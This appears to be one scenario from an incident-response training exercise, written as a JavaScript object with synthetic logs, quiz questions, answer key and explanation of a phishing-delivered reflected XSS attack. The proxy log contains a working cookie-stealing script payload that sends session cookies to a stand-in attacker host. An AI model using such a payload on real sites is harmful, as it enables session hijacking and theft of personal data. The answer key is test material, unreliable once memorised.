scenarios.push({
    id: "ir-scenario-2026-xss-attack",
    title: "Operation Script Trap: Cross-Site Scripting",
    description: "Suspicious script payloads detected in search-query parameters of the internal employee portal, followed by unauthorized session activity.",
    logs: {
        proxy: [
            "2026-06-01T08:15:20Z - IP: 192.168.10.10 - URL: https://portal.company.local/search?q=benefits - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 12500",
            "2026-06-01T08:22:45Z - IP: 192.168.10.14 - URL: https://github.com/company-org/frontend - Action: Allowed - Category: IT/Development - Status: 200 - Bytes: 45200",
            "2026-06-01T08:35:10Z - IP: 192.168.10.88 - URL: https://portal.company.local/search?q=holiday_schedule - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 11200",
            "2026-06-01T08:50:10Z - IP: 192.168.10.33 - URL: https://portal.company.local/search?q=%3Cscript%3Enew%20Image().src='http://evil-c2.top/log?c='%2Bdocument.cookie;%3C/script%3E - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 14500",
            "2026-06-01T08:50:11Z - IP: 192.168.10.33 - URL: http://evil-c2.top/log?c=session_id=A9F3B211X_HR_ADMIN - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 43",
            "2026-06-01T08:55:00Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Status: 200 - Bytes: 3100",
            "2026-06-01T09:05:00Z - IP: 203.0.113.88 - URL: https://portal.company.local/api/hr/employee_pii_export - Action: Allowed - Category: Internal Portal - Status: 200 - Cookie: session_id=A9F3B211X_HR_ADMIN - Bytes: 4500000",
            "2026-06-01T09:12:15Z - IP: 192.168.10.88 - URL: https://portal.company.local/dashboard - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 24000"
        ],
        email: [
            "2026-06-01T08:00:10Z - Inbound - From: notifications@slack.com - To: mrogers@company.com - Subject: Daily Team Sync - Status: Delivered",
            "2026-06-01T08:30:15Z - Inbound - From: alerts@bamboohr.com - To: asmith@company.com - Subject: Timesheet Approved - Status: Delivered",
            "2026-06-01T08:45:10Z - Inbound - From: portal-admin@company-updates-local.com - To: mrogers@company.com - Subject: URGENT: Review Pending Employee Profile Discrepancies - Status: Delivered",
            "2026-06-01T09:10:00Z - Inbound - From: newsletter@techtrends.com - To: jdoe@company.com - Subject: Weekly Technology Brief - Status: Delivered"
        ],
        file_server: [
            "2026-06-01T08:20:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
            "2026-06-01T08:21:05Z - Object Accessed: \\\\FILE-SRV-01\\Public\\Templates\\Onboarding_Guide.pdf - Accesses: ReadData - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
            "2026-06-01T09:15:20Z - Share Name: \\\\FILE-SRV-01\\DevShare - Access Request: Allowed - Source IP: 192.168.10.14 - User: COMPANY\\rjones"
        ],
        workstations: [
            "2026-06-01T08:15:00Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: explorer.exe spawned chrome.exe",
            "2026-06-01T08:35:05Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: explorer.exe spawned outlook.exe",
            "2026-06-01T08:50:10Z - WKSTN-33 (192.168.10.33) - EventID: 4688 - Process Created: outlook.exe spawned chrome.exe --url https://portal.company.local/search?q=%3Cscript...",
            "2026-06-01T09:00:15Z - WKSTN-33 (192.168.10.33) - EventID: 7036 - Service Status Change: Windows Update Service entered the running state.",
            "2026-06-01T09:12:00Z - WKSTN-03 (192.168.10.14) - EventID: 4688 - Process Created: explorer.exe spawned vscode.exe"
        ],
        auth_logs: [
            "2026-06-01T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith - Logon Type: 2 (Interactive)",
            "2026-06-01T08:05:00Z - IdP_Auth - User: mrogers@company.com - App: O365 Portal - AuthMethod: Password+MFA - Status: Success - IP: 192.168.10.33",
            "2026-06-01T08:10:00Z - WKSTN-08 (192.168.10.88) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe - Logon Type: 2 (Interactive)",
            "2026-06-01T09:05:00Z - Portal_Auth - User: mrogers@company.com - App: Internal HR Portal - AuthMethod: Session_Token - Status: Success - IP: 203.0.113.88 - Note: Anomalous external IP authenticating with active session token"
        ]
    },
    questions: {
        vector: {
            label: "What was the initial delivery vector used to execute the malicious payload?",
            type: "select",
            options: [
                "An unauthenticated SQL injection exploit on the public web gateway",
                "A spear-phishing email containing a crafted, malicious URL link",
                "A malicious document attachment executing macros",
                "A supply chain compromise of the portal's JavaScript libraries"
            ],
            correct: "A spear-phishing email containing a crafted, malicious URL link"
        },
        hijack: {
            label: "How did the attacker bypass authentication to access the sensitive /api/hr/employee_pii_export endpoint?",
            type: "select",
            options: [
                "By performing a Pass-the-Hash attack using stolen NTLM credentials",
                "By brute-forcing the user's password over an exposed administrative interface",
                "By leveraging stolen session cookies exfiltrated via a reflected XSS script",
                "By executing an Insecure Direct Object Reference (IDOR) manipulation"
            ],
            correct: "By leveraging stolen session cookies exfiltrated via a reflected XSS script"
        },
        indicator: {
            label: "Which specific indicator confirms the execution of the Cross-Site Scripting (XSS) payload in the user's browser?",
            type: "select",
            options: [
                "A subsequent outbound proxy request to evil-c2.top appending the document.cookie parameter",
                "A massive 4.5MB data transfer from the HR API to an external IP",
                "Outlook.exe spawning chrome.exe in the workstation process logs",
                "An anomalous authentication event originating from IP 203.0.113.88"
            ],
            correct: "A subsequent outbound proxy request to evil-c2.top appending the document.cookie parameter"
        }
    },
    principles: [
        "Cross-Site Scripting (XSS)",
        "Phishing / Social Engineering",
        "Data Exfiltration (Overt Channel)"
    ],
    explanation: "At 08:45:10Z, user 'mrogers' received a spear-phishing email from a lookalike domain containing a malicious link. At 08:50:10Z, the user clicked the link, causing Outlook to spawn Chrome and navigate to the company's internal portal with a crafted URL parameter. Because the internal portal was vulnerable to Reflected Cross-Site Scripting (XSS), it rendered the injected <script> tag into the victim's browser. The malicious script instantly executed, grabbing the victim's active session cookie (session_id=A9F3B211X_HR_ADMIN) and forwarding it to the attacker's drop server at evil-c2.top. At 09:05:00Z, the attacker (IP 203.0.113.88) used this stolen session token to hijack the victim's identity and authenticate to the portal without needing a password or MFA. The attacker then executed a 4.5MB overt exfiltration of employee PII data. This demonstrates a complete kill chain moving from Social Engineering, to Client-Side Execution (XSS), to Session Hijacking, and finally Data Exfiltration."
});